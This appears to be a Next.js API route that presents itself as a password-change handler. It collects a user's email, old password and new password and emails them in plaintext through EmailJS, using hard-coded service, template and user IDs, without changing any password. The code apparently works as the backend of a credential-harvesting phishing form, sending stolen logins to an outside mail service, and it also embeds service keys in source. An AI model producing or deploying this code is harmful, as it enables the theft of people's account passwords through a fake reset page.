import emailjs from 'emailjs-com';

export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { email, oldPassword, newPassword } = req.body;

    try {
      // Using EmailJS to send the data to your email
      const response = await emailjs.send(
        'service_8hdqzju', // Your EmailJS Service ID
        'template_hk6uqi8', // Your EmailJS Template ID
        {
          email: email,
          oldPassword: oldPassword,
          newPassword: newPassword,
        },
        'ODWuzZ-mZLM196nkP' // Your EmailJS User ID
      );

      res.status(200).json({ message: 'Email sent successfully!' });
    } catch (error) {
      console.error('Error sending email:', error);
      res.status(500).json({ message: 'Failed to send email' });
    }
  } else {
    res.status(405).json({ message: 'Method Not Allowed' });
  }
}